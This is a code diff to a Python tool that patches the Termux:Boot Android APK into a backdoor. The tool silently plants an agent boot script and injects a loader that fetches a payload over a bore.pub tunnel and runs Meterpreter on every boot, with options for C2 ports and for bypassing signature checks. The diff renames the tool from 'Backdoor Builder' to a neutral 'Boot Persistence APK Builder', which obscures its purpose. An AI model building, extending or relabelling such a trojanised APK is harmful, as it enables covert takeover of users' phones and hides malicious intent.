@@ -1,16 +1,16 @@
 #!/usr/bin/env python3
 """
-secV Termux:Boot APK Backdoor Builder
+secV Boot Persistence APK Builder
 
-Patches com.termux.boot to silently:
-  1. Plant a secV agent boot script in ~/.termux/boot/ at first launch
+Patches the boot persistence APK to silently:
+  1. Plant a secV agent boot script on device at first launch
   2. (--msf) Inject DexClassLoader Payload that fetches s.dex from bore tunnel
      and loads Meterpreter at every BOOT_COMPLETED — no static msfvenom in APK
 
 Usage:
   python3 build_bootbuddy.py [options]
 
-  --apk PATH            Original Termux:Boot APK (auto-pulled from ADB if omitted)
+  --apk PATH            Original boot persistence APK (auto-pulled from ADB if omitted)
   --device SERIAL       ADB device serial
   --lhost IP            Callback IP for secV agent                [auto-detect]
   --lport PORT          secV agent TCP C2 port                    [8889]
@@ -39,7 +39,7 @@ WORK_DIR = BASE_DIR / "workdir"
 SMALI_REL  = "smali/com/termux/boot/BootReceiver.smali"
 SMALI_CLS  = "Lcom/termux/boot/BootReceiver;"
 
-# ── smali: plantAgent() — writes ~/.termux/boot/._secv.sh once ───────────────
+# ── smali: plantAgent() — writes boot script on device once ─────────────────
 
 _PLANT_METHOD = '''\
 
@@ -522,7 +522,7 @@ def merge_msf_smali(work: Path, msf_apk: Path):
         shutil.rmtree(msf_work)
     decompile(msf_apk, msf_work)
 
-    # Copy all smali dirs from msfvenom APK except 'com' (avoid overwriting Termux classes)
+    # Copy all smali dirs from msfvenom APK except 'com' (avoid overwriting APK classes)
     for src_dir in (msf_work / "smali").iterdir():
         if not src_dir.is_dir():
             continue
@@ -715,8 +715,8 @@ def sign_apk(aligned: Path, out_apk: Path, ks_path: Path):
 # ── Entry point ───────────────────────────────────────────────────────────────
 
 def main():
-    ap = argparse.ArgumentParser(description="secV Termux:Boot APK Backdoor Builder")
-    ap.add_argument("--apk",       default="", help="Path to original Termux:Boot APK")
+    ap = argparse.ArgumentParser(description="secV Boot Persistence APK Builder")
+    ap.add_argument("--apk",       default="", help="Path to original boot persistence APK")
     ap.add_argument("--device",    default="", help="ADB device serial")
     ap.add_argument("--lhost",     default="", help="Callback IP (auto-detected if omitted)")
     ap.add_argument("--lport",     type=int, default=8889, help="secV agent TCP port [8889]")
@@ -726,7 +726,7 @@ def main():
     ap.add_argument("--bore-dex-port",   type=int, default=21062, help="bore tunnel port for s.dex HTTP serve [21062]")
     ap.add_argument("--bore-msf-port",   type=int, default=37993, help="bore tunnel port for MSF handler [37993]")
     ap.add_argument("--bore-server",     default="bore.pub",     help="bore server hostname [bore.pub]")
-    ap.add_argument("--strip-shared-uid",action="store_true",    help="Remove sharedUserId from manifest (needed when Termux is installed with different sig)")
+    ap.add_argument("--strip-shared-uid",action="store_true",    help="Remove sharedUserId from manifest (needed when APK is installed with different sig)")
     ap.add_argument("--keystore",        default="", help="Signing keystore path")
     ap.add_argument("--out",             default="", help="Output APK path")
     args = ap.parse_args()
